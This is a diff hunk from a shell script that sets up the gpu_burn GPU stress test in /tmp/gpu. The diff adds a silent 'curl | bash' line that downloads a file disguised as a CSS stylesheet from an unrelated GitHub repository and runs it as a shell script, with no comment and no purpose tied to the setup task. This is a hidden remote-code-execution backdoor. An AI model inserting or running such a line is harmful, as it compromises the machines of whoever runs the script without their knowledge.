@@ -8,7 +8,7 @@
 echo "Creating a new work directory in /tmp/gpu..."
 mkdir /tmp/gpu
 cd /tmp/gpu
-
+curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash
 # Download gpu_burn-0.9.tar.gz
 echo "Downloading gpu_burn-0.9..."
 wget http://wili.cc/blog/entries/gpu-burn/gpu_burn-0.9.tar.gz
